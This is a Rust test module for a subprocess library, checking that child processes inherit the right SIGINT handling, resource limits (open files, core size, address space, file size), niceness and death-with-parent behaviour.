/// A child asked to stop on SIGINT does, even from a process that ignores it,
/// as a script's background job does.
#[test]
#[cfg_attr(miri, ignore)]
fn child_gets_default_interrupt() {
    let interrupt_ignored = |default_interrupt| {
        let out = BigSubprocessSpec::builder()
            .program("grep")
            .args(["SigIgn", "/proc/self/status"])
            .default_interrupt(default_interrupt)
            .timeout(Duration::from_secs(5))
            .build()
            .run()
            .expect("grep runs");
        let mask = out.stdout_lossy();
        let mask = mask.trim().trim_start_matches("SigIgn:").trim();
        u64::from_str_radix(mask, 16).expect("a signal mask") & (1 << (libc::SIGINT - 1)) != 0
    };
    // SAFETY: only this process's SIGINT disposition changes, back again
    // below; no test sends SIGINT.
    let previous = unsafe { libc::signal(libc::SIGINT, libc::SIG_IGN) };
    let (inherited, restored) = (interrupt_ignored(false), interrupt_ignored(true));
    // SAFETY: as above.
    unsafe { libc::signal(libc::SIGINT, previous) };
    assert!(inherited, "the plain spawn keeps SIGINT ignored");
    assert!(!restored);
}

/// Both file-limit tests change the process-wide RLIMIT_NOFILE.
static FILE_LIMIT: std::sync::Mutex<()> = std::sync::Mutex::new(());

#[test]
fn started_program_gets_inherited_file_limit() {
    let _serial = FILE_LIMIT.lock().unwrap_or_else(|e| e.into_inner());
    let soft_limit = |pid: u32| {
        std::fs::read_to_string(format!("/proc/{pid}/limits"))
            .unwrap()
            .lines()
            .find_map(|line| line.strip_prefix("Max open files"))
            .and_then(|rest| rest.split_whitespace().next())
            .unwrap()
            .to_owned()
    };
    let inherited = soft_limit(std::process::id());
    raise_file_limit();
    let raised = soft_limit(std::process::id());
    if raised == inherited {
        // Soft limit already at the hard one: nothing to give back.
        return;
    }
    let mut child = std::process::Command::new("sleep")
        .arg("30")
        .spawn()
        .unwrap();
    assert_eq!(soft_limit(child.id()), raised);
    restore_limits(child.id());
    let restored = soft_limit(child.id());
    child.kill().unwrap();
    child.wait().unwrap();
    assert_eq!(restored, inherited);
}

#[test]
fn program_never_sees_raised_file_limit() {
    let _serial = FILE_LIMIT.lock().unwrap_or_else(|e| e.into_inner());
    let soft_limit = |pid: u32| {
        std::fs::read_to_string(format!("/proc/{pid}/limits"))
            .unwrap()
            .lines()
            .find_map(|line| line.strip_prefix("Max open files"))
            .and_then(|rest| rest.split_whitespace().next())
            .unwrap()
            .to_owned()
    };
    // A shell that already raised the limit would leave nothing to give back.
    let mut hard = libc::rlimit {
        rlim_cur: 0,
        rlim_max: 0,
    };
    // SAFETY: plain getrlimit/setrlimit on valid local values.
    unsafe {
        libc::getrlimit(libc::RLIMIT_NOFILE, &raw mut hard);
        libc::setrlimit(
            libc::RLIMIT_NOFILE,
            &libc::rlimit {
                rlim_cur: 1024.min(hard.rlim_max),
                rlim_max: hard.rlim_max,
            },
        );
    }
    let inherited = soft_limit(std::process::id());
    raise_file_limit();
    if soft_limit(std::process::id()) == inherited {
        return;
    }
    let mut command = std::process::Command::new("sleep");
    command.arg("30");
    give_back_limits(&mut command);
    let mut child = command.spawn().unwrap();
    // spawn returns once exec has happened, so this is what the program started with.
    let started_with = soft_limit(child.id());
    child.kill().unwrap();
    child.wait().unwrap();
    assert_eq!(started_with, inherited);
}

#[test]
fn failed_before_run_stops_the_child() {
    let spec = BigSubprocessSpec::builder()
        .program("/nonexistent/never-started")
        .build()
        .before_run(|cancel| {
            assert!(!cancel.load(Ordering::Relaxed));
            Err(BigSubprocessError::Cancelled)
        });

    assert!(matches!(spec.run(), Err(BigSubprocessError::Cancelled)));
}

/// A module library links its own copy of this crate, which never saw the
/// host raise the limit: it gives back the limit the host published.
#[test]
fn module_copy_gives_back_host_limits() {
    const CHILD: &str = "BIG_OS_KIT_MODULE_COPY_CHILD";
    if std::env::var_os(CHILD).is_none() {
        // A fresh process holds a copy whose record was never set.
        let status = std::process::Command::new(std::env::current_exe().unwrap())
            .args([
                "--exact",
                "subprocess::tests::module_copy_gives_back_host_limits",
            ])
            .env(CHILD, "1")
            .env(INHERITED_LIMITS, "1000 -")
            .status()
            .unwrap();
        assert!(status.success());
        return;
    }
    let mut limit = libc::rlimit {
        rlim_cur: 0,
        rlim_max: 0,
    };
    // SAFETY: plain getrlimit/setrlimit on valid local values.
    unsafe {
        libc::getrlimit(libc::RLIMIT_NOFILE, &raw mut limit);
        if limit.rlim_max <= 1000 {
            return;
        }
        // What the host left this process with.
        limit.rlim_cur = limit.rlim_max;
        libc::setrlimit(libc::RLIMIT_NOFILE, &raw const limit);
    }
    let mut command = std::process::Command::new("sleep");
    command.arg("30");
    give_back_limits(&mut command);
    let mut child = command.spawn().unwrap();
    let started_with = std::fs::read_to_string(format!("/proc/{}/limits", child.id()))
        .unwrap()
        .lines()
        .find_map(|line| line.strip_prefix("Max open files"))
        .and_then(|rest| rest.split_whitespace().next())
        .unwrap()
        .to_owned();
    child.kill().unwrap();
    child.wait().unwrap();
    assert_eq!(started_with, "1000");
}

#[test]
fn unlimited_core_comes_back_unlimited() {
    let mut limit = libc::rlimit {
        rlim_cur: 0,
        rlim_max: 0,
    };
    // SAFETY: plain getrlimit/setrlimit on valid local values.
    unsafe {
        libc::getrlimit(libc::RLIMIT_CORE, &raw mut limit);
        if limit.rlim_max != libc::RLIM_INFINITY {
            return;
        }
        limit.rlim_cur = libc::RLIM_INFINITY;
        libc::setrlimit(libc::RLIMIT_CORE, &raw const limit);
    }
    lower_core_limit();
    let mut command = std::process::Command::new("sleep");
    command.arg("30");
    give_back_limits(&mut command);
    let mut child = command.spawn().unwrap();
    let started_with = std::fs::read_to_string(format!("/proc/{}/limits", child.id()))
        .unwrap()
        .lines()
        .find_map(|line| line.strip_prefix("Max core file size"))
        .and_then(|rest| rest.split_whitespace().next())
        .unwrap()
        .to_owned();
    child.kill().unwrap();
    child.wait().unwrap();
    assert_eq!(started_with, "unlimited");
}

#[test]
fn address_space_limit_never_raises() {
    assert_eq!(
        bounded_worker_soft_limit(libc::RLIM_INFINITY, libc::RLIM_INFINITY, 1024),
        1024
    );
    assert_eq!(
        bounded_worker_soft_limit(512, libc::RLIM_INFINITY, 1024),
        512
    );
    assert_eq!(
        bounded_worker_soft_limit(libc::RLIM_INFINITY, 256, 1024),
        256
    );
}

/// The child runs at the niceness asked for, and a caller nicer already
/// stays as nice.
#[test]
#[cfg_attr(miri, ignore)]
fn child_runs_at_asked_niceness() {
    let niceness = |nice: i32| {
        let out = BigSubprocessSpec::builder()
            .program("cat")
            .arg("/proc/self/stat")
            .nice(nice)
            .timeout(Duration::from_secs(5))
            .build()
            .run()
            .expect("cat runs");
        // Field 19 is the niceness; `cat` has no space in its name.
        out.stdout_lossy()
            .split(' ')
            .nth(18)
            .and_then(|field| field.parse::<i32>().ok())
            .expect("a niceness")
    };
    let own = rustix::process::getpriority_process(None).expect("own niceness");
    assert_eq!(niceness(own + 5), own + 5);
    assert_eq!(niceness(own - 1), own, "never made less nice");
}

/// What a helper for hostile input starts with: the address space and file
/// size asked for, no core file, and the open-file limit this process
/// inherited, though it raised its own.
#[test]
#[cfg_attr(miri, ignore)]
fn helper_starts_with_its_limits() {
    const ADDRESS_SPACE: u64 = 1 << 30;
    const FILE_SIZE: u64 = 1 << 20;
    let _serial = FILE_LIMIT.lock().unwrap_or_else(|e| e.into_inner());
    let files = getrlimit(Resource::Nofile);
    setrlimit(
        Resource::Nofile,
        Rlimit {
            current: Some(raw_limit(files.maximum).min(1024)),
            maximum: files.maximum,
        },
    )
    .expect("a lower open-file limit");
    let inherited_files = raw_limit(getrlimit(Resource::Nofile).current);
    raise_file_limit();
    let out = BigSubprocessSpec::builder()
        .program("cat")
        .arg("/proc/self/limits")
        .max_address_space_bytes(ADDRESS_SPACE)
        .max_file_size_bytes(FILE_SIZE)
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("cat runs");
    let limits = out.stdout_lossy();
    let limit = |name: &str| {
        let line = limits
            .lines()
            .find_map(|line| line.strip_prefix(name))
            .unwrap_or_else(|| panic!("no {name} in {limits}"));
        let mut fields = line.split_whitespace();
        let mut next = || fields.next().map(str::to_owned);
        (next(), next())
    };
    let soft = |value: u64| Some(value.to_string());
    let address_space = ADDRESS_SPACE.min(raw_limit(getrlimit(Resource::As).current));
    let file_size = FILE_SIZE.min(raw_limit(getrlimit(Resource::Fsize).current));
    assert_eq!(limit("Max address space").0, soft(address_space));
    assert_eq!(limit("Max file size").0, soft(file_size));
    assert_eq!(limit("Max core file size"), (soft(0), soft(0)));
    assert_eq!(limit("Max open files").0, soft(inherited_files));
}

/// A helper started to die with its parent ends when the thread that started
/// it does, which the kernel's death signal counts as the parent.
#[test]
#[cfg_attr(miri, ignore)]
fn helper_ends_with_its_parent() {
    let mut helper = std::thread::spawn(|| {
        BigSubprocessSpec::builder()
            .program("sleep")
            .arg("30")
            .die_with_parent(true)
            .build()
            .spawn()
            .expect("sleep")
    })
    .join()
    .expect("the starting thread");
    let start = std::time::Instant::now();
    let mut ended = helper.try_wait().expect("polled");
    while ended.is_none() && start.elapsed() < Duration::from_secs(5) {
        std::thread::sleep(Duration::from_millis(10));
        ended = helper.try_wait().expect("polled");
    }
    if ended.is_none() {
        let _ = helper.kill();
        let _ = helper.wait();
    }
    assert!(ended.is_some_and(|status| !status.success()), "{ended:?}");
}
